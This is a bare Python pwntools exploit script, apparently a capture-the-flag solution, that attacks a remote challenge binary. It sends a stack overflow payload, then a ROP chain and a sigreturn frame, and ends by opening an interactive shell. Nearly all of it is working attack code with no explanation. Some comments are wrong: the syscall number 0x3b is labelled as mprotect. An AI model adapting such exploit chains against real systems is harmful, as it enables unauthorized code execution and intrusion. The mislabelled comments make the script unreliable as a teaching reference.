from pwn import *

#io = process("./back",env={"LD_PRELOAD":"./libc-2.27.so"})
context.clear(arch="amd64")
io = remote("challenges.ctfd.io",30096)
read_got = 0x404098
bss = read_got + 0x20
pop_rdi = 0x00000000004011ab
pop_rsi = 0x00000000004011a9
payload = "a"*0x80  + p64(bss) + p64(0x000000000040112a)
ret2 = 0x0000000000401030
#gdb.attach(io)
io.send(payload)
set_eax = 0x404008+2
ret = 0x0000000000401016
payload = (p64(0x4040e0)*41 + p64(pop_rsi) + p64(set_eax) + p64(0)+p64(ret2)+p64(ret)).ljust(0x150,"a")
io.send(payload)
frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x3b # SET RAX TO MPROTECT SYSCALL NUMBER
frame.rdi = 0x404140 # SET RDI TO TEST ADDRESS
frame.rsi = 0 # SET RSI TO SIZE
frame.rdx = 0
frame.rip = 0x000000000040113b
read= 0x000000000040113b
payload = (p64(read)).ljust(0xa0,"b")
io.send(payload)

pay = "\x40\x34\x07"
payload = "b"*14 + "\x7f"
io.send(payload)
io.interactive()
